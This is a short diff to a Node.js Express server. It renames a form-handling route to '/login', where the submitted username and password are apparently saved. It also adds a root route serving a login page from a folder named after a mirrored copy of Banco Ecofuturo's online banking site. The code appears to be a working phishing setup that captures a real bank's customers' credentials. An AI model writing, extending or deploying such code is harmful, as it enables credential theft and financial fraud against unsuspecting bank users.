@@ -12,7 +12,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-app.post('/save-data', (req, res) => {
+app.post('/login', (req, res) => {
     const usuario = req.body.usuario;
     const password = req.body.password;
 
@@ -28,6 +28,11 @@ app.post('/save-data', (req, res) => {
             res.send("Se guardaron tus datos");
         }
     });
+});
+
+
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'ecofuturo', 'econet.bancoecofuturo.com.bo_447', 'EconetWeb', 'Login.html'));
 });
 
 app.listen(port, () => {
